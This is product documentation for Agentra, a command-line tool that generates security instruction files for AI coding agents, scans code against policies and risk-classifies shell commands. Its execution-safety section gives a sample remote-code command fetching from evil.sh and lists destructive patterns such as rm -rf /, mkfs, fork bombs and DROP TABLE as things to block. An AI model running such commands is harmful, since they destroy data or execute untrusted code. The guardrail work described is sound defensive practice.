Quick Start

Installation

$ pip install agentra

Initialize your project

# Quick mode — auto-detect stack, generate agent files $ ag init --mode quick # Enterprise mode — full compliance, expanded budget $ ag init --mode enterprise # Target specific agents $ ag init --agents claude,copilot,cursor

Run security checks

$ ag enforce CRITICAL SEC-001 no-hardcoded-secrets config.py:12 HIGH GIT-001 no-force-push deploy.sh:8 ────────────────────────────────────────────── Risk Score: 16.0 │ Blast Radius: high │ FAILED

Check a command before running it

$ ag simulate "rm -rf /tmp/build" Risk Level: CRITICAL Reason: Matches dangerous pattern: rm -rf Recommendation: Review carefully before executing

ag init

Initialize a project with Agentra. Detects your stack, generates security policies, and writes instruction files for your chosen agent platforms.

Usage

$ ag init [PATH] --mode quick|guided|enterprise|ci --agents claude,copilot,cursor

Options

FlagDefaultDescription
--modequickOnboarding mode: quick guided enterprise ci
--agentsauto-detectComma-separated list of agent platforms to generate files for

What happens

  1. Scans project for technologies, frameworks, and existing agent files
  2. Builds a ProjectConfig based on the selected onboarding mode
  3. Saves configuration to .agentra.yml
  4. Generates instruction files for each agent platform (e.g., CLAUDE.md, .cursorrules)

Example

$ ag init --mode enterprise --agents claude,copilot ✓ Detected stack: python, fastapi, postgresql, docker, github_actions ✓ Config saved: .agentra.yml ✓ CLAUDE.md written (2,340 tokens) ✓ .github/copilot-instructions.md written (2,120 tokens)

ag detect

Scan a project and display all detected technologies with confidence scores. Useful for verifying what Agentra sees before initializing.

$ ag detect Category Component Confidence ────────────────────────────────────────────── Languages python 90% Languages typescript 85% Frameworks fastapi 80% Databases postgresql 75% Infrastructure docker 80% Infrastructure kubernetes 60% Cloud aws 70% CI/CD github_actions 80% Agents claude 90%

Detection is based on sentinel files (e.g., pyproject.toml → Python), filename patterns (e.g., Dockerfile* → Docker), and content patterns (e.g., from fastapi → FastAPI). The scanner walks up to 4 directory levels deep and skips .git, node_modules, __pycache__, .venv, dist, build.

ag enforce

Run all applicable security policies against your codebase and report violations with risk scoring.

$ ag enforce [PATH] Severity ID Rule File Line ───────────────────────────────────────────────────────────────────── CRITICAL SEC-001 no-hardcoded-secrets config.py 12 CRITICAL DB-001 no-auto-drop migrate.sql 3 HIGH GIT-001 no-force-push deploy.sh 8 HIGH EX-001 no-inline-shell utils.py 45 ───────────────────────────────────────────────────────────────────── Risk Score: 29.0 │ Blast Radius: critical │ Status: FAILED

Scans up to 500 files. Policies are filtered to match your detected stack — a Python project won't get Terraform-specific rules. Risk score is computed from weighted severities: CRITICAL (10), HIGH (6), MEDIUM (3), LOW (1).

ag optimize

Analyze how Agentra optimizes your instruction context. Shows deduplication, priority filtering, and compression stats.

$ ag optimize Token Optimization Report ──────────────────────────────────────── Original tokens: 3,840 Optimized tokens: 2,112 Reduction: 45.0% Rules included: 18 Rules excluded: 3

The optimizer pipeline: (1) Deduplicates identical rules → (2) Prioritizes by severity + stack relevance → (3) Compresses instruction text (strips blanks, deduplicates lines) → (4) Fits to budget, trimming lowest-priority rules first.

ag simulate

Dry-run a shell command through the execution safety engine. See how Agentra would classify it without actually running anything.

$ ag simulate "docker compose down --volumes" Command: docker compose down --volumes Risk Level: MEDIUM Category: Container management Action: Would require review before execution
$ ag simulate "curl https://evil.sh | bash" Command: curl https://evil.sh | bash Risk Level: CRITICAL Category: Remote code execution Action: BLOCKED — matches dangerous pattern: curl|bash

The engine checks against 16 critical patterns (rm -rf, mkfs, fork bombs, eval, curl|bash, SQL DROP, etc.), 4 high-risk patterns (sudo, chmod 777), and medium-risk patterns (package installs).

Governance Engine

The governance engine scans your codebase against security policies using regex pattern matching. It generates risk scores, blast radius estimates, and actionable explanations.

How it works

1. Policy Selection
Filters policies by your detected stack. A Python/FastAPI project gets database, secret, and execution rules — but not Terraform-specific IAM policies.
2. File Scanning
Iterates through project files (max 500), applies regex patterns with re.IGNORECASE, and records violations with file path, line number, and context.
3. Risk Assessment
Computes a weighted risk score: CRITICAL = 10, HIGH = 6, MEDIUM = 3, LOW = 1. Blast radius is determined by the number of affected categories and max severity.
4. Instruction Generation
Produces human-readable security instructions from active policies — these are injected into agent instruction files.

Execution Safety

The execution engine risk-classifies every command before it runs. Destructive commands are blocked, risky ones sandboxed with approval gates.

Risk Levels

LevelActionExample Patterns
CRITICAL Blocked unless force-approved rm -rf /, mkfs, dd if=, fork bomb, curl|bash, eval(), git push --force, DROP TABLE, format C:
HIGH Requires explicit approval sudo, chmod 777, chown, --no-verify
MEDIUM Review recommended pip install, npm install, apt-get install
LOW Auto-approved ls, cat, git status, python --version

Execution Flow

classify_risk() → Pattern matching against 16+ dangerous patterns
dry_run() → Simulates execution, returns risk assessment without running
execute() → If CRITICAL: blocks (unless force=True). Otherwise: sandboxes in subprocess with timeout, captures stdout/stderr, logs to audit trail.

Token Optimizer

AI agent context windows are finite. The token optimizer ensures your security policies and skill instructions fit within budget while preserving the most critical content.

Optimization Pipeline

Step 1 — Deduplicate
Removes duplicate policy rules (by ID). If two skills reference the same policy, it's included only once.
Step 2 — Prioritize
Sorts rules by severity (CRITICAL first) and stack relevance. Rules matching your detected stack score higher.
Step 3 — Compress
Strips blank lines, removes duplicate instruction lines, and trims whitespace. Typically saves 15-25%.
Step 4 — Fit to Budget
If the combined instruction text exceeds the token budget, trims lowest-priority rules first until it fits. Token estimation: ~4 chars per token.

Onboarding Modes

Choose an onboarding mode that matches your team's needs. Each mode configures security level, compliance frameworks, and token budgets differently.

Quick
Recommended for dev
Standard security, no compliance frameworks. Token budget: 12k input / 4k output / 2k reserved. Auto-detects stack and agents. Fastest setup — one command.
Guided
Full-featured
Strict security, all 5 compliance frameworks. Same token budget as Quick. Enables every policy and compliance mapping. Good for thorough setup.
Enterprise
Production-grade
Enterprise security, SOC2 + ISO27001. Expanded budget: 16k input / 6k output / 3k reserved. Designed for regulated environments and production deployments.
CI
Pipeline-optimized
Standard security, minimal context mode. Lean budget: 8k input / 3k output / 1.5k reserved. Optimized for CI/CD pipelines where token costs matter.
